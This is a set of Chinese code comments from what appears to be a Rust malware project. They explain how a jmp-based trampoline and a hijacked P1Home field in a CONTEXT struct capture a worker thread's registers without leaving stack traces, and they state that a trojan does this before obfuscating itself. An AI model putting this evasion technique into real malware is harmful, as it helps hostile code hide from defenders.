// 而tampoline(mov rcx,rdx xor rdx,rdx jmpQWORD PTR [rcx])其物理上直接jmp到RtlCaptureContext.
// 它没有proluge:没有修改栈的指令,栈状态干净;使用jmp而不是call 无条件跳转不向栈压入返回地址.
// 在cpu看来 和线程池内核调度器直接调用一样,从而抓到完美的,没有代码痕迹的工作线程快照.
// 而 NtSetEvent 这个win api 根本不关心调用者的栈和寄存器状态,它无所谓被包装函数修改

// 注释4
// 这涉及rust中ffi的类型强转机制和rust编译器的安全保证
// 1. 隐式类型转换(Implicit Coercions):rust中存在引用到裸指针的隐式强转.
// &mut T 可隐式且安全的强转为 *mut T
// &T 可隐式且安全的强转为 *const T

// 注释5
// win64 fast call的前四个参数通过rcx,rdx,r8,r9传递.发生函数调用时,调用者在栈上为这4个寄存器预留32字节shadow sapace,用于被调用函数在必要时将寄存器的值写回/备份到栈上,这4个栈槽称为Parameter Home.
// P1Home是CONTEXT的第一个成员,偏移量为0,在语义上代表RCX(即第一个参数备份槽).但在CONTEXT中,P1Home只是结构体头部的8字节,并不等同RCX寄存器本身,RCX在结构体后面有独立的专属字段
// rcx寄存器本身是cpu内部的一组物理触发器/锁存器,是由晶体管直接构成的硬件存储单元,位于cpu内部的寄存器堆中.其读写与cpu主频同步,远快于内存.在一个逻辑cpu核心中,物理上只有一个rcx寄存器,它没有内存地址,无法对rcx寄存器进行&
// P1Home其本质是ram中的一个8字节存储单元.由明确的内存地址(位于堆或栈上).cpu无法直接在P1Home内部进行运算,必须先用mov 将其读入到某个物理寄存器上,运算后再写回内存.
// 为啥要在CONTEXT结构体的开头定义P1Home这个字段?
// win32下,函数参数全部通过内存栈传递;win64下,为了提升速度,前四个参数用寄存器传递,且caller必须在栈上预留32字节的shadow space,这个四个槽位在内核中被称为P1Home-P4Home.这四个槽位为了操作对应的寄存器中的值(写入或读取对应寄存器中的值)
// 既然这四个槽位只是栈上参数的备份,为啥要定义在CONTEXT中呢?
// 当win发生异常,cpu从用户态转为内核态,内核调用异常分发函数.为了调用异常处理函数,内核必须在栈上为其准备好调用环境,包括异常处理函数需要接收的参数,依照win64 fast call在栈上预留了四个参数的Home槽.为了让内核的汇编代码在处理异常时方便,微软把这个4个Home槽设计在CONTEXT结构体的开头处
// 以上,在一个CONTEXT结构体中,ctx.rcx保存的是当前程序崩溃/挂起的瞬间,cpu硬件rcx寄存器中的数据,这个数据是线程的真实运行状态;ctx.P1Home保存的是为了调用异常处理函数,在栈上预留的第一个参数的影子空间.线程在正常运行时,这里通常是空或垃圾数,内核在回复线程时根本不去读取它.
// 但在wait函数中,并没有使用异常机制.
// 木马在开始混淆之前,必须抓取worker thread的寄存器快照.如果直接调用RtlCaptureContext,编译器会生成call指令.而call会污染当前调用栈(把当前函数的返回地址压栈),且可能因为函数进入/退出(prologue和epilogue)修改rsp和rbp.
// 为了避开call,这里用了trampoline使用jmp跳转到rcx内存地址中存放的函数.在trampoline中最后一句`jmp qword ptr [rcx]`,cpu读取rcx指向的内存开头的8字节,把这8字节当成函数地址并跳进去.此时,rcx指向的是ctx_init结构体,其开头的8字节就是P1Home.等于劫持了P1Home字段,把RtlCaptureContext地址塞了进去.
// 这是一种纯粹利用物理内存布局实现汇编间接跳转的技巧